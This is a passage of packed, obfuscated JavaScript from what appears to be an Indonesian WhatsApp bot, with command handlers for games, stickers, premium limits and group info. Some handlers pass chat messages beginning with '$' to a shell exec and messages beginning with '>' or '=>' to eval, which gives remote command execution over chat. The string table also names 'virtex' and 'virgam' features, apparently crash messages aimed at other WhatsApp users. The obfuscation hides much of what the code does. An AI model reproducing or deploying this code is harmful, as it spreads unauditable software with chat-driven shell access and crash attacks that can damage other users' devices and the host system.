D(1o[A(3u)][\'9M\']);if((2R&&!L[\'1s\'][\'4u\']||3k)&&Q[A(1m)]==J){3A=3k?1h[A(1X)](1h[A(1V)](L)[A(1B)](\'6O\',\'m\'))[A(1c)][A(1v)][A(1G)]:L,3C=M K[\'6y\'](3A,8R=2E()),c1=Q[A(3n)](\'\\B\');1q 6e=M K[A(cQ)](F),4V=6e[A(aG)],4f=[];4V[A(5M)](2A 188=>{W tM=A;4f[tM(4b)](188[\'id\'][\'3h\'](tM(il),tM(ey)))});1q 6q={\'1n\':{\'3a\':4f},\'1b\':L};7y=fs[A(1C)](3C),K[\'1K\'](F,7y,7s,6q),fs[A(2g)](3C)}Y{if((2R&&!L[A(1c)][A(3Q)]||2p)&&Q[A(1m)]==J){3A=2p?1h[A(1X)](1h[A(1V)](L)[A(1B)](A(2k),\'m\'))[A(1c)][A(1v)][A(1G)]:L,3C=M K[A(6p)](3A,8R=2E()),c1=Q[A(3n)](\'\\B\');1q 6e=M K[A(cQ)](F),4V=6e[A(aG)],4f=[];4V[A(5M)](2A 189=>{W tN=A;4f[tN(4b)](189[\'id\'][tN(1B)](\'c.us\',tN(ey)))});1q 6q={\'1n\':{\'3a\':4f},\'1b\':L};7y=fs[A(1C)](3C),K[A(1l)](F,7y,2c,6q),fs[\'5p\'](3C)}Y{if((2R&&!L[\'1s\'][A(3Q)]||4o)&&Q[A(1m)]==J){3A=4o?1h[A(1X)](1h[A(1V)](L)[A(1B)](A(2k),\'m\'))[\'1s\'][A(1v)][A(1G)]:L,3C=M K[\'6y\'](3A,8R=2E()),c1=Q[A(3n)](\'\\B\');1q 6e=M K[A(cQ)](F),4V=6e[A(aG)],4f=[];4V[\'7O\'](2A 18a=>{W tO=A;4f[tO(4b)](18a[\'id\'][tO(1B)](tO(il),\'s.2l.2v\'))});1q 6q={\'3j\':A(8w),\'6a\':!![],\'1n\':{\'3a\':4f},\'1b\':L};7y=fs[\'2B\'](3C),K[A(1l)](F,7y,4J,6q),fs[\'5p\'](3C)}Y{if((2R&&!L[A(1c)][\'4u\']||3J)&&Q[A(1m)]==J){3A=3J?1h[A(1X)](1h[A(1V)](L)[A(1B)](A(2k),\'m\'))[A(1c)][A(1v)][A(1G)]:L,3C=M K[\'6y\'](3A,8R=2E()),c1=Q[A(3n)](\'\\B\');1q 6e=M K[A(cQ)](F),4V=6e[\'hb\'],4f=[];4V[\'7O\'](2A 18b=>{W tP=A;4f[tP(4b)](18b[\'id\'][tP(1B)](\'c.us\',tP(ey)))});1q 6q={\'3j\':A(tC),\'1n\':{\'3a\':4f},\'1b\':L};7y=fs[\'2B\'](3C),K[A(1l)](F,7y,4y,6q),fs[\'5p\'](3C)}Y D(A(2a6)+R+A(sE))}}}T;H\'2a7\':if(4Z(1p,2Y,1k,3B,1w))E 3o(A(7x)+R+A(7u));1Y{D(1o[A(1Q)]);if(!7g(Q[J])&&!Q[J][A(1M)](A(ZK)))E D(1o[\'Iv\']);if(!N)E D(A(2a8));sd=Q[J];1q dc=sd[A(1y)](A(9t))[U];if(!dc)E D(A(2a9));ij=[];Z{id:18c,kk:mN,q8:18d,Dg:2aa,jO:G7,Dh:18e,hb:18f,jN:18g,Di:mO,Dj:G8,kv:18h}=M K[\'fu\']({\'3X\':[A(g7),\'nw\',dc],\'ii\':!![]}),G9=A(2ab)+18c+\'\\I\'+(mN?A(2ac)+mN[\'2K\'](\'@\')[J]:A(2ad))+A(2ae)+18d+A(2af)+ua(18h*8v)+A(2ag)+18g+\'\\I\'+(G7?\'*jb*\\B:\\B\'+G7:A(2ah))+A(2ai)+18e+\'\\I\'+(mO?A(2aj)+mO[A(1y)](\'@\')[J]:A(2ak))+\'\\I*yq*\\B:\\B\'+(G8?\'\'+ua(G8*8v):\'-\')+A(2al);1T(Z tQ of 18f){G9+=A(2am)+tQ[\'id\'][\'2K\'](\'@\')[J]+A(Fp)+(tQ[A(2an)]?\'Ya\':\'6N\')+\'\\I\',ij[A(4b)](\'\'+tQ[\'id\'][A(1B)](/@c.us/g,\'@s.2l.2v\'))}ij[A(4b)](\'\'+(mN?\'\'+mN[\'3h\'](/@c.us/g,A(2t)):\'-\')),ij[A(4b)](\'\'+(mO?\'\'+mO[A(1B)](/@c.us/g,\'@s.2l.2v\'):\'-\')),K[\'1K\'](F,G9,1r,{\'1b\':L,\'1n\':{\'3a\':ij}}),5a(1p,1w)}1P(Gb){1t[A(1D)](Gb),D(\'\'+Gb)}T;H\'d\':H A(2ao):H A(bN):bG==bC?K[A(2ap)](F,{\'id\':L[\'1s\'][A(1v)][A(1G)][A(2aq)],\'3f\':F,\'2b\':!![]}):D(A(18i));T;H A(2ar):if(bG==bC){18j=M K[A(2as)](F,L[A(1c)][\'2e\'][\'1n\'][\'pW\']),Gd=[],Ge=\'▢\',1a=A(2at);1T(Z tR of 18j[A(2au)]){1a+=Ge+\'\\B\'+\'@\'+tR[A(2D)][A(1y)](\'@\')[J]+\'\\I\',1a+=A(2av)+Ge+A(2aw)+6r((\'\'+tR[\'t\'])*8v)[\'tz\'](A(bA))[\'kl\'](\'DD/MM/R6\\xK:mm:ss\')+\'\\I\\I\',Gd[A(4b)](tR[A(2D)])}5F(1a,Gd,!![])}Y D(A(18i));T;H A(zT):if(!1k)E 1S();if(!1A)E D(1o[A(3u)][A(7c)]);!ab(1z,F,2n)&&ad(1z,2n);if(qf)E D(A(2ax));ae(F,1z,2n),D(\'eY\\fh\\2ay\\1x\\4i\\3N\');T;H A(2az):if(!1k)E 1S();1Y{if(!qf)E D(A(2aA));ag(A(zT),F,2n),D(A(2aB))}1P(Gf){1t[A(1D)](Gf),D(\'\'+Gf)}T;H A(2aC):H\'2aD\':if(2X)E;if(!N)E D(A(2aE));if(!1A)E D(1o[\'9c\'][A(7c)]);1q 2aF=L[\'2w\'];Gg=[],1a=\'\\I\';1T(Z Gh of 6Y){1a+=A(2aG)+Gh[A(2D)][A(1y)](\'@\')[J]+\'\\I\',Gg[A(4b)](Gh[A(2D)])}5F(A(2aH)+2m+\'\\I\\I\\2aI\\B:\\B\\B\'+N+A(2aJ)+6Y[\'2P\']+A(2aK)+1a+A(2aL),Gg,![]);T;H A(G4):1t[\'3P\'](A(2aM)),K[A(1l)](F,uf[A(2aN)](R),1r,{\'1b\':L});T;H A(VJ):if(!8Q){if(!bJ)E}if(2X)E;aI(A(2aO)+N+A(2aP)+2m+A(2aQ));T;H A(VK):if(!8Q){if(!bJ)E}if(2X)E;aI(\'xg\\1x\\Ox\\ox\\B@\'+N+A(2aR)+2m+A(2aS));T;H A(VH):if(!8Q){if(!bJ)E}if(2X)E;D(\'@\'+N+\'\\R9\\1x\\2aT\\5Q\\dC\\2aU\\2aV\\B+\\Ra\\B:v\');T;H A(VF):if(!8Q){if(!bJ)E}if(2X)E;D(\'@\'+N+A(2aW));T;H A(VI):if(!8Q){if(!bJ)E}if(2X)E;D(A(2aX)+N+A(2aY));T;H A(VG):if(!8Q){if(!bJ)E}if(2X)E;D(\'*Py*\');T;H A(qa):5w=M K[A(t7)](8b+\'@c.us\'),5w=5w[\'2L\']==g0?\'\':5w[A(aK)],kX(F,8b,uS,5w);T;H A(2aZ):H A(2b0):{if(Q[A(1m)]<U)E D(\'wv\\5c\');if(!7g)E D(A(2b1));W 18k=(18l,18m)=>{E 4O 2b2((18n,18o)=>{W iP=dj;E c9(18l,18m)[iP(2h)](18p=>18p[iP(4v)]())[iP(2h)](18q=>18n(18q))[iP(4m)](Gi=>{W Gj=iP;1t[Gj(1D)](1E(Gi,Gj(fS))),18o(Gi)})})};18r=M 18k(\'1I://NP.1W/3x-8W.2b3?4w=\'+N),18s=\'*2b4\\B:\\B\'+18r+\'*\',D(18s)}T;H\'gw\':H\'2b5\':H A(2b6):if(2X)E;1a=gw[A(18t)](R,3b,2m,5L),gl=[{\'1i\':R+A(qa),\'1j\':{\'1f\':A(18u)},\'1e\':U},{\'1i\':A(Gk),\'1j\':{\'1f\':\'ᴋᴏᴅᴇ\\Bϙʀ\'},\'1e\':U}],4c(F,1a,3E,3D,gl);T;H A(2b7):if(!1k)E D(1o[A(3u)][\'9M\']);if(Q[A(1m)]<U)E D(\'Ja?\');1T(Z Gl=J;Gl<Q[J];Gl++){K[A(2b8)](F,J)}D(\'2N\\pI\\cz\\kx\\B\'+Q[A(3n)](\'\\B\'));T;H A(Zx):if(!1k)E D(1o[A(3u)][\'9M\']);if(Q[A(1m)]<U)E D(A(2b9));1T(Z Gm=J;Gm<Q[J];Gm++){V6(F)}D(A(2ba)+Q[A(3n)](\'\\B\'));T;u2:if(6X&&!ak&&!gB&&!8M&&!fM||!fM&&!gB&&!8M&&6X&&ak&&!L[A(1Z)][A(3i)]){if(3Y)7T(Sj);Y{if(5N){W Gn=[\'./aD/2bb.6m\',A(2bc),\'./aD/2bd.6m\',\'./aD/2be.6m\',A(2bf),A(2bg),A(2bh),A(2bi),A(2bj)],18v=Gn[1u[\'4H\'](1u[A(2s)]()*Gn[A(1m)])];pG=fs[A(1C)](\'\'+18v),K[A(1l)](F,pG,7s,{\'1b\':L,\'1n\':1F})}Y 8N&&D(SA)}}1A&&6X&&fM&&!L[A(1Z)][A(3i)]&&!r8&&!Bt&&!2R&&(cH=M 7Z(\'1I://3x.QB.2v/v2/?2T=\'+fG+A(BJ)),hT=cH[A(rk)],D(hT))}1A&&L[A(1Z)][A(3i)]&&2H[\'3y\'](A(2bk))&&(M aI(A(2bl)),4n(()=>{W 18w=A;K[18w(15y)](F)},2bm));if(Hq[\'3y\'](9f)){if(6L(A(4W),1p,3w))E;if(1k)E;if(2X)E;6s(A(4W),1p,\'10s\',3w);if(3Y)7T(zP);Y 5N?2I(I3):D(\'2bn\\2bo\\2bp\')}if(2H[\'3y\'](A(2bq))||2H[A(1M)](A(2br))){if(6L(A(4W),1p,3w))E;6s(\'fE\',1p,A(bO),3w);if(3Y)7T(Sx);Y 5N?qF(I5):D(\'2bs\\1H\')}if(aS[A(1M)](9f)){if(6L(A(4W),1p,3w))E;if(1k)E;D(A(2bt)+2m+A(2bu)+R+A(2bv)),6s(A(4W),1p,\'10s\',3w)}if(!1k&&Hj[A(1M)](9f)){if(6L(\'fE\',1p,3w))E;6s(\'fE\',1p,A(bO),3w);if(3Y)7T(Sl);Y 5N?M 2I(I2):(18x=M 3W(A(2bw)),M K[A(1l)](F,18x,4J,{\'3j\':\'8X/aA\',\'1b\':L,\'6a\':!![]}),M D(A(2bx)))}if(Ho[\'3y\'](9f)){if(6L(A(4W),1p,3w))E;6s(A(4W),1p,\'10s\',3w),3Y?7T(zP):aI(Uo)}if(Hk[\'3y\'](9f)){if(2X)E;if(6L(A(4W),1p,3w))E;6s(A(4W),1p,\'10s\',3w);if(3Y)E 7T(Sv)}if(Hp[A(1M)](9f)){if(2X)E;if(6L(A(4W),1p,3w))E;6s(A(4W),1p,A(bO),3w);if(3F>=A(18y)&&3F<=A(2by))E D(\'Ni\\bn\\8T\\zW\\1H\');if(3Y===!![])E 7T(So);D(5L+A(18z))}if(Hl[A(1M)](9f)){if(2X)E;if(6L(A(4W),1p,3w))E;6s(A(4W),1p,A(bO),3w);if(3F>=\'dJ:4R\'&&3F<=\'17:4R\')E D(A(2bz));3Y?7T(Sq):D(5L+\'\\1H\\B🙂\')}if(Hm[\'3y\'](9f)){if(2X)E;if(6L(\'fE\',1p,3w))E;6s(A(4W),1p,A(bO),3w),3Y?7T(Ss):D(5L+A(18z))}if(Hn[A(1M)](9f)){if(2X)E;if(6L(\'fE\',1p,3w))E;6s(A(4W),1p,A(bO),3w),3Y?7T(Sz):D(\'??\')}if(2H[A(1M)](A(2bA))){if(6L(A(4W),1p,3w))E;6s(A(4W),1p,A(bO),3w),K[A(1l)](F,A(2bB)+hw+A(2bC),1r,{\'1b\':2d,\'1n\':1F})}if(!1k&&1A&&2H[A(1M)](8b)){if(6L(A(4W),1p,3w))E;if(dW)E;6s(\'fE\',1p,A(bO),3w);W Go=[A(2bD),A(2bE),A(2bF)],18A=Go[1u[\'4H\'](1u[\'8Y\']()*Go[\'2P\'])];K[A(1l)](F,18A,1r,{\'1b\':L})}1T(Z 18B of Hr){if(2H[A(1M)](18B)||fH==A(Ef)){if(2X)E;if(L[A(1Z)][A(3i)])E;if(6L(A(4W),1p,3w))E;6s(A(4W),1p,\'10s\',3w);if(5N)E 2I(I4);D(A(2bG)+2m)}}(2j===A(s6)||2H[A(1M)](A(2bH))||2H[A(1M)](A(2bI)))&&!1R[A(U8)]&&!1A&&!dW&&!1k&&(2H[A(5D)](R+\'z8\')?1t[A(1D)](A(2bJ)):(1a=A(2bK)+gw[A(18t)](R,3b,2m,5L),gl=[{\'1i\':R+\'kk\',\'1j\':{\'1f\':A(18u)},\'1e\':U},{\'1i\':A(Gk),\'1j\':{\'1f\':\'ᴋᴏᴅᴇ\\Bϙʀ\'},\'1e\':U}],4c(F,1a,\'©\\B\'+2C,3D,gl)));if(!1A&&2H[A(5D)](\'sv\')){if(6L(A(4W),1p,3w))E;6s(A(4W),1p,A(bO),3w),D(\'2bL\\5Q\\MU\\2bM\\6k,\\gJ\\3Z\\2bN\\18C\\8m\')}if(5h[A(5D)](R+A(2bO))){if(!8Q){if(!bJ)E D(\'7p\')}if(2X)E;D(A(2bP)),1O(F,\'2bQ\\1x\\2bR\\9J\\B🤭\',\'7r\\7P\\5e\\5S\',[{\'1i\':\'\'+R+BL+\'\\B\'+N,\'1j\':{\'1f\':A(Gp)+BL},\'1e\':U},{\'1i\':\'\'+R+BN+\'\\B\'+N,\'1j\':{\'1f\':A(Gp)+BN},\'1e\':U},{\'1i\':\'\'+R+BP+\'\\B\'+N,\'1j\':{\'1f\':A(Gp)+BP},\'1e\':U}])}if(fH==A(D0)){if(2X)E;1q Gq=K[A(bZ)][A(18D)][A(aM)](18E=>18E[A(2D)][\'bu\'](A(Dv))),Gr=K[\'dO\'][A(18D)][A(aM)](18F=>18F[\'8q\'][\'bu\'](\'s.2l.2v\')),18G=(hP[\'2bS\']()[A(2bT)]/9p/9p)[A(187)](4D)+A(2bU)+1u[A(hV)](1L(\'os\')[A(2bV)]/9p/9p)+\'MB\';yh=hP[\'yh\']();W 2bW=gq();1q 2bX=ed(Gq[\'2P\']+\'\\B\'+Gr[A(1m)]);W{2bY:18H,2bZ:18I,2c0:18J,2c1:18K,2c2:18L,2c3:18M}=K[\'1w\'][A(2c4)];6b=H7[A(2c5)](7f,18H,18I,18J,18K,18L,18M,os,18G,Gr,Gq,zK,zL,uV,2q,8b);Z 2c6=fs[A(1C)](A(sk));18N={\'1n\':{\'fk\':1F,\'cR\':{\'4l\':5L+\'\\B\'+2m,\'bL\':A(CR),\'kV\':\'2\',\'2U\':fs[\'2B\'](A(sk)),\'kW\':A(2c7)}}},gl=[{\'1i\':A(Gs),\'1j\':{\'1f\':A(2c8)},\'1e\':U},{\'1i\':\'NM\',\'1j\':{\'1f\':A(2c9)},\'1e\':U}],4h===A(9j)?fP(F,6b,A(a2)+4T[A(6o)]+\'\\I©\\B\'+2C,fs[\'2B\'](A(g3)),gl,18N):4c(F,6b,A(a2)+4T[\'hk\']+\'\\I©\\B\'+2C,fs[A(1C)](\'./4E/oP.3c\'),gl,{\'1n\':1F})}if(fH==A(Gk)){if(2X)E;1O(F,A(2ca),A(3v),[{\'1i\':R+A(182),\'1j\':{\'1f\':A(2cb)},\'1e\':U},{\'1i\':R+A(2cc),\'1j\':{\'1f\':A(2cd)},\'1e\':U},{\'1i\':R+A(181),\'1j\':{\'1f\':A(2ce)},\'1e\':U}])}if(fH==A(2cf)){if(2X)E;5w=M K[A(t7)](6n[A(1y)](\'@\')[J]+A(hy)),5w=5w[A(aK)]==g0?\'\':5w[A(aK)],lM=K[\'by\'][6n]!=2O?K[A(5X)][6n][A(9g)]=2O?6K(\'+\'+6n[A(1B)](A(2t),\'\'))[\'k5\'](\'k1\'):K[\'by\'][6n][A(9g)]||K[A(5X)][6n][A(i6)]:6K(\'+\'+6n[A(1B)](A(2t),\'\'))[A(a3)](A(bS)),kX(F,\'\'+6n[\'2K\'](\'@\')[J],lM,5w),D(A(2cg))}if(fH==A(Gs)){if(2X)E;1t[A(1D)](A(Gs));Z 18O=[{\'1i\':\'o5\',\'1j\':{\'1f\':A(my)},\'1e\':A(3I)},{\'1i\':R+A(G4),\'1j\':{\'1f\':\'ᴅᴏɴᴀsɪ\'},\'1e\':A(3I)}];1a=\'6W\\yF\\pX\\6x\\B🤗\\pQ:\\b0://bp.1W/fj?v=yy\',3U=\'1I://i.oE.1W/vi/yy/z0.3c\',9q=M 3W(3U),ib={\'1n\':{\'fk\':1F,\'cR\':{\'4l\':5L+\'\\B\'+2m,\'bL\':A(CR),\'kV\':\'2\',\'2U\':9q,\'kW\':A(2ch)}}},fP(F,1a,3E,fs[A(1C)](A(g3)),18O,ib)}if(fH==A(2ci)){1a=A(2cj)+2q+A(2ck)+2q+A(2cl)+2q+\'\\I\\B\\B\\B\\B\\B\\jT.\\ow\\3Z\\5I\\jk\\18P\\2cm\\B\\I\\B\\B\\B\\B\\4s\\2cn\\2co\\2cp\\I\\B\\B\\B\\B\\B\\jU.\\KL\\2cq\\kh/7p\\bm\\B\\I\\B\\B\\B\\B\\2cr\\18Q\\2z\\bk\\3O\\pX\\I\\B\\B\\B\\B\\3O\\3M\\cj\\2cs\\dQ\\vb*vc*4Q\\I\\B\\B\\B\\B\\B\\oK.\\2ct\\dQ\\nG\\5d\\2F\\4j,\\B\\I\\B\\B\\B\\B\\gS\\oO\\2cu\\fB\\B\\I\\B\\B\\B\\B\\2cv\\dQ\\aB\\I\\B\\B\\B\\B\\B\\B\\B\\B\\B\\wX.\\bs\\3N\\3S\\1x\\18R\\3L\\I\\B\\B\\B\\B\\dQ\\vb*vV\\2cw\\kh*4Q\\Gt\\nW\\I\\B\\B\\B\\B\\4j\\mt\\6k\\5I\\4P\\xV\\2z\\I\\B\\B\\B\\B\\fB,\\2cx\\4j\\2F\\I\\B\\B\\B\\B\\2cy\\6k\\ha,\\mt\\aC\\I\\B\\B\\B\\B\\wS\\18Q\\2z\\fB\\I\\B\\B\\B\\B\\B\\wW.\\bs\\3N\\cj\\3S\\1x\\18R\\3L\\B\\I\\B\\B\\B\\B\\It\\2cz\\2cA\\Gt\\2o\\vW\\B\\I\\B\\B\\B\\B\\PB\\2cB,\\mt\\bs\\3Z\\I\\B\\B\\B\\B\\5I\\18S\\2o\\eZ\\p6\\8o\\I\\B\\B\\B\\B\\wY.\\j0\\2cC\\2cD\\2cE\\6k!\\I\\B\\B\\B\\B\\Gt\\2cF\\mt\\2o\\5I\\2cG\\B\\I\\B\\B\\B\\B\\cl,gH\\5Q\\ko\\cz\\I\\pE.\\bs\\3Z\\5I\\18S\\aC\\2F\\I\\B\\B\\B\\B\\B\\B\\18P\\4s\\1x\\18C\\2cH\';Z 18T=[{\'1i\':\'o5\',\'1j\':{\'1f\':A(my)},\'1e\':A(3I)},{\'1i\':R+A(2cI),\'1j\':{\'1f\':A(2cJ)},\'1e\':A(3I)}];4c(F,1a,\'©\\B\'+2C,fs[A(1C)](A(sk)),18T,{\'1n\':1F})}if(2H[A(5D)](\'$\')){if(!L[A(1Z)][A(3i)]&&!1k)E 1S();18U=2H[A(4U)](4D),3s(18U,(Gu,Gv)=>{W 18V=A;if(Gu)E D(3E+18V(2cK)+Gu);Gv&&D(Gv)})}if(2H[A(5D)](\'>\')){if(!L[A(1Z)][\'2b\']&&!1k)E 1S();1Y{E K[A(1l)](F,1h[A(1V)](18W(2H[A(4U)](4D)),3T,\'\\2cL\'),1r,{\'1b\':L})}1P(18X){e=lY(18X),D(e)}}if(2H[A(5D)](\'=>\')){if(!1k&&!L[A(1Z)][A(3i)])E 1S();1q 18Y=2H[\'cL\'](eO);2cM=Gw=>{W Gx=A;1q Gy=1h[Gx(1V)](Gw,3T,4D);E Gz=gs[\'kl\'](Gy),Gy==2O&&(Gz=gs[Gx(7t)](Gw)),D(Gz)};1Y{D(gs[A(7t)](18W(\';(2A\\B()\\B=>\\B{\\B\'+18Y+A(2cN)))),1t[\'3P\'](A(2cO),\'[\',A(2cP),\']\',q4,1E(\'>\',\'ct\'),\'yG\',1E(2a[A(1y)](\'@\')[J]),\'2cQ\\B:\',1E(Q[A(1m)]))}1P(18Z){D(lY(18Z))}}3F>=A(2cR)&&3F<=A(2cS)&&1t[A(1D)](1E(\'[\'+2q+\']\',A(7v)),1E(A(2cT),A(el))),3F>=A(2cU)&&3F<=A(2cV)&&1t[A(1D)](1E(\'[\'+2q+\']\',A(7v)),1E(\'4r\\kn\\2cW\\xi\\1H\',A(el))),3F>=A(2cX)&&3F<=A(2cY)&&1t[\'3P\'](1E(\'[\'+2q+\']\',A(7v)),1E(A(2cZ),A(el))),3F>=A(18y)&&3F<=A(2d0)&&1t[A(1D)](1E(\'[\'+2q+\']\',A(7v)),1E(\'2d1\\1H,\\2d2\\xa\\2d3\\1H?\',A(el))),3F>=A(2d4)&&3F<=A(2d5)&&1t[A(1D)](1E(\'[\'+2q+\']\',A(7v)),1E(A(2d6),A(el))),3F>=A(2d7)&&3F<=A(2d8)&&1t[A(1D)](1E(\'[\'+2q+\']\',A(7v)),1E(A(2d9),\'aE\')),3F>=A(2da)&&3F<=A(2db)&&1t[A(1D)](1E(\'[\'+2q+\']\',\'jJ\'),1E(A(2dc),\'aE\')),3F>=A(2dd)&&3F<=A(2de)&&1t[A(1D)](1E(\'[\'+2q+\']\',A(7v)),1E(A(2df),\'aE\')),3F>=A(2dg)&&3F<=A(2dh)&&1t[A(1D)](1E(\'[\'+2q+\']\',A(7v)),1E(A(2di),\'aE\')),3F>=A(2dj)&&3F<=A(2dk)&&1t[A(1D)](1E(\'[\'+2q+\']\',\'jJ\'),1E(2q+A(2dl),\'aE\'))}1P(6J){6J=lY(6J);if(!6J[A(1M)](A(2dm))){1t[A(1D)](1E(A(2dn),\'hg\'),1E(6J,\'ct\'));if(6J[\'3y\'](\'2do:\\2dp\\2dq\\ol\\2dr\'))E D(A(mP)+6J+A(2ds)+2C);if(6J[A(1M)](A(2dt)))E D(A(mP)+6J+\'\\j6\\B:\\2du\\2dv\\2dw\\7n\\B🤣\\I\\I©\\B\'+2C);if(6J[A(1M)](A(2dx)))E D(A(mP)+6J+A(2dy));if(6J[A(1M)](A(2dz)))E D(A(mP)+6J+A(2dA)+2C);M D(A(mP)+6J+\'\\I\\I©\\B\'+2C);if(6J[A(1M)](A(2dB)))E;if(HQ(6J,1h[A(1X)](fs[A(1C)](\'./7C/aj.3X\'))))E;uz(6J,1z,1h[A(1X)](fs[\'2B\'](A(DO))));9B&&(uA(1z,9A),M D(A(2dC)));if(gE){M K[A(1l)](\'\'+6n,A(2dD)+2m+\'\\px\\B:\\B\'+1p+\'\\I\\yp\\h5\\B:\\B\\I\\I\'+6J+A(ZP)+R+1z+A(2dE)+N+A(ZQ)+2C+\'\\I\'+7f+\'\\I\',1r),M K[A(9V)](\'\'+6n,9w[\'bx\']);if(9B)E;4n(()=>{W 190=A;K[\'1K\'](F,190(2dF),1r)},lb)}}}}1P(iQ){iQ=lY(iQ),!iQ[A(1M)](\'2r.Lx\')&&(!iQ[A(1M)](A(2dG))&&1t[A(1D)](1E(A(2dH),A(V8)),1E(iQ,\'ct\')))}};',62,8538,'||||||||||||||||||||||||||||||||||||_0x8744f8|x20||_0x132f79|return|_0x251749||case|x0a|0x0|_0x1743b5|_0x4b7170|await|_0x1d297c|||_0x1e1fd1|_0x9cbc5c||break|0x1||const||else|let|||||||||||_0x41b3ed|quoted|0x9b2||type|displayText|_0x1fb18d|JSON|buttonId|buttonText|_0x330973|0x4a5|0x7dd|contextInfo|_0x246f0e|_0x44493b|var|_0x5892f5|message|console|Math|0x568|user|x20di|0x3eb|_0x47082a|_0x4a60cd|0xa03|0xae5|0x297|color|_0x41d4e5|0x5e7|x20kak|https|game|sendMessage|require|0x866|caption|_0x79d744|catch|0x384|_0x180e36|_0x2a7100|for|_0x17b24d|0x292|com|0x4e9|try|0x951|||||||||||_0x13c32a|fromMe|_0x1e8833|_0xfd8603|extendedTextMessage|0x957|0x5c0|0x2da|ran|_0x3f0175|0xb00|whatsapp|_0x55b62b|DataId|x20kamu|_0x3db697|fake|this|0x22e|0x55c|_0x30e7e4|net|participant|key|lib|x20ke|async|readFileSync|fake1|0x956|getRandom|x20yang|Berhasil|_0xb27b59|_0x1051d6|data|split|status|x20telah|Sukses|undefined|length|_0xa3222f|_0x308c55|mentioned|text|thumbnail|textpro|_0xd8a912|_0x29fffc|_0x40e95b|_0x56de49|||||||||||mentionedJid|settings|jpg||0xa9d|remoteJid|randKey|replace|0x7c6|mimetype|_0x2cb0d5|parse|x20aktif|0x61c|_0x1fc95d|_0x3c9a19|buffer|buff|exec|Qoted|0x30b|0x7fd|AntiSpam|api|includes|_0x4df5aa|encmedia|limitCount|file|thumb|copyright|_0x4d5eb1|media|x20lagi|0x2de|_0xfb6f6|MessageType|x20dengan|x20bisa|x20ini|x20atau|log|0x2e9|0x624|x20sudah|null|nana|function|getBuffer|json|autovn|x20tidak|||||||||||x20off|0x611|_0x138d0c|0x5ca|0xc8|_0x17d819|jsonData|setmenu|x20group|x20error|x20mengubah|title|0xacb|setTimeout|_0x566f4a|jumlahTroli|Reply|Udah|x20untuk|x22|videoMessage|0x233|url|orderMessage|_0x848607|itemCount|0x7c4|_0x2cb1d2|0x987|0x2|stik|MODE|x20on|floor|0x1df|_0x388367|surface|orderTitle|sellerJid|0x5c9|new|x20auto|_|00|stringify|_0x35f9ad|0x853|_0x30a1e1|0xa8f|0x6ea|_0x1d100d|isLimit|||||||||||limitAdd|gamewaktu|x20link|x20ada|x20salah|then|wait|_0x197f51|0x50f|boij|delb|ytdl|premium|hanyaadmin|Mode|unlinkSync|jpegThumbnail|0xb39|0x6ae|_0xcf3fa9|0x51b|0x8cb|stst|0x884|_0x122c3a|Off|Masukan|Fitur|x20teks|0x73a|_0x52ebbb|_0x1e5179|ranp|emoji|x20akan|images|0x278|_0x1e9661|0x4b1|autosticker|temp|x20Lagi|x20dan|html|x20satu|asu|Number|result|Object|0x883|0x6ce|_0x45db5f|||||||||||ptt|menunya|0x4da|0x9b0|_0x2b855a|_0x291c5f|randIndex|_prem|sewa|jadiinadmin|x20bot|x20pesan|webp|Ownerin|0x542|0x6a9|_0xcfde2e|moment|addSpam|ban|x20apa|x20limit|x20mengirim|x20aku|downloadAndSaveMediaMessage|0x873|0xaf6|mhan|_0x2e630c|0x8e2|0x70a|emoje|woy|anjay|buffer453|_0x2c5743|PhoneNumber|cekSpam|tebakanime|Tidak|quotedM|x201|x20grup|x20mana|x20kick|ahah|x0acode|x0avendor|Nih|_0x4d830e|_0x1e3de8|_0x3295ba|||||||||||0x5cc|0x350|0x3c4|premnih|_0x218b2e|calender|isUrl|randomNomor|tictactoe|checkDataId|jpeg|tebakgambar|replyType|x20chat|sticker|Error|x20matikan|Silahkan|_0x28c7d1|0x6a2|0x5fd|0x31d|rano|0x4d4|ini_buffer|_0x5734d5|push|_scommand|database|tebakkata|tebakbendera|x20itu|x20Rp|x20ketik|x0aContoh|name|x20kirim|x20dong|x20jam|herokuapp|map|x20pilih|ownerNumber|0x6fd|0x91a|_0x55e4aa|0xa5c|0x4d7|Nomer|lulu|_0x4a6d22|fetchJson|||||||||||virtex7|nomerOwner|tebaklirik|siapaaku|Kirim|x20gambar|x20block|x20Contoh|x20Di|image|x20sama|x20premium|x20nomer|effect|x20detik|limit|jid|downloadMediaMessage|imageMessage|0x8af|0x9c3|0x3e8|0x4ff|0x21c|0x5dc|_0x46e33d|0x3c3|0x5e6|teks1|0x540|0xa|ffmpeg|FileSize|h2k|addBalance|getBalance|virgam|forwarding|nopref|typing|family100|caklontong|autoWelcome|filename|filter|x20ga|x20nomor|x20orang|create|audio|random|x20Group|||||||||||x0aJawaban|RESPONSE|only|x20nama|join|_0x5113bf|0x867|forwardingScore|isForwarded|0x977|0x581|0x57b|Date|_0x4513c0|0x8dc|0x400|foto|0x276|08|0x1f5|0x93f|_0x4966f6|ChatModification|primbon|isGame|gameAdd|listcmdblock|autoblockcmd|mtk|Kamu|x20benar|x20owner|Penggunaan|x20wa|teks|x20nih|video|nulis|ownerB|link|_0xae2264|_0x31c985|buttons|_0x597254|_0x4bf095|_0x5810d6||0xa63|0xad3|0x854|mp3File|_0xf23a76|ras|0x460|0x512|0x462|ger|outMp4|teks2|ana|_0x289ce6|parseInt|Mimetype|checkDataName||createDataId|addDataId||removeDataId|virtex8|commandsDB|listerror|multi|autoread|setBc||docType||x20admin|www|List|x20Bulan||online||x20coba|x20oleh|Link|mp4|x20tersebut|x20user|respon|cyan|0x696|0x3ce|0x840|_0x3bd705|_0x351e1a|0x6a8|rus|0x441|_0x2858db|_0x4a1b26|0x9ca|_0x4ab17e|_sewa|menu|0x40e|explain|publik|autobio|Loading|Myprofile|Mainlagi|x20https|tag|chat|x20caption|x20dari|tiktok|x20ANTI|input|conversation|x20command|x20Limit|group||x20mau||x20Tidak||png|x20jawaban||x20Owner|Gagal|x20silahkan|x20udah|x20Tahun|youtube|reply||x20Bot|BROADCAST|endsWith|x20habis|Baterai|delete|contacts|disable|0xb48|0x88c|_0x29e2ed|0x272|chatss|sendEphemeral|_0x39dfa7|_0x6a753f|_0xefb03a|_0x40bf25|0xb76|body|0x481|0x842|0x5ba|_0x38b405|_0x2a0636|_0x1cdce2|0x40a|0x3b9|_0x11656f|_0x9d3ddc|0x83d|0x5c7|RegExp|0x796|_0x291407|_0x11afcd|0x6b1|entah|0x58d|0x712|_0x5987b7|_0x459f00|0x4|fetch|setiker|audionye|blocked|hitnya|davizin|autorespon|AutoClearChat|x20adalah|x0aTotal|x20juga|x20tag|x20banned|x